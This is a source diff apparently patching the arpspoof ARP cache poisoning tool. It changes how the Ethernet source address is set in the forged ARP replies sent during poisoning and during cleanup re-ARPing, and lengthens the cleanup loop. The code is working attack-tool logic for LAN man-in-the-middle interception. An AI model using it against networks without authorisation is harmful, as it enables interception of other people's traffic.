@@ -54,16 +54,19 @@ usage(void)
 static int
 arp_send(libnet_t *l, int op,
 	u_int8_t *sha, in_addr_t spa,
-	u_int8_t *tha, in_addr_t tpa)
+	u_int8_t *tha, in_addr_t tpa,
+	u_int8_t *me)
 {
 	int retval;
-	
+
+	if (!me) me = sha;
+
 	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
 			     tha, (u_int8_t *)&tpa, l);
-	libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, l, 0);
+	libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
 	
 	fprintf(stderr, "%s ",
-		ether_ntoa((struct ether_addr *)sha));
+		ether_ntoa((struct ether_addr *)me));
 
 	if (op == ARPOP_REQUEST) {
 		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
@@ -122,7 +125,7 @@ arp_find(in_addr_t ip, struct ether_addr *mac)
 		/* XXX - force the kernel to arp. feh. */
 		arp_force(ip);
 #else
-		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip);
+		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
 #endif
 		sleep(1);
 	}
@@ -151,7 +154,7 @@ cleanup(int sig)
 	int i;
 
 	fprintf(stderr, "Cleaning up and re-arping targets...\n");
-	for (i = 0; i < 5; i++) {
+	for (i = 0; i < 10; i++) {
 		struct host *target = targets;
 		while(target->ip) {
 			/* XXX - on BSD, requires ETHERSPOOF kernel. */
@@ -159,7 +162,8 @@ cleanup(int sig)
 				arp_send(l, ARPOP_REPLY,
 					 (u_int8_t *)&spoof.mac, spoof.ip,
 					 (target->ip ? (u_int8_t *)&target->mac : brd_ha),
-					 target->ip);
+					 target->ip,
+					 (i%2 ? my_ha : NULL));
 				/* we have to wait a moment before sending the next packet */
 				sleep(1);
 			}
@@ -167,7 +171,8 @@ cleanup(int sig)
 				arp_send(l, ARPOP_REPLY,
 					 (u_int8_t *)&target->mac, target->ip,
 					 (u_int8_t *)&spoof.mac,
-					 spoof.ip);
+					 spoof.ip,
+					 (i%2 ? my_ha : NULL));
 				sleep(1);
 			}
 			target++;
@@ -259,9 +264,10 @@ main(int argc, char *argv[])
 		while(target->ip) {
 			arp_send(l, ARPOP_REPLY, my_ha, spoof.ip,
 				(target->ip ? (u_int8_t *)&target->mac : brd_ha),
-				target->ip);
+				target->ip,
+				my_ha);
 			if (poison_reverse) {
-				arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip);
+				arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip, my_ha);
 			}
 			target++;
 		}
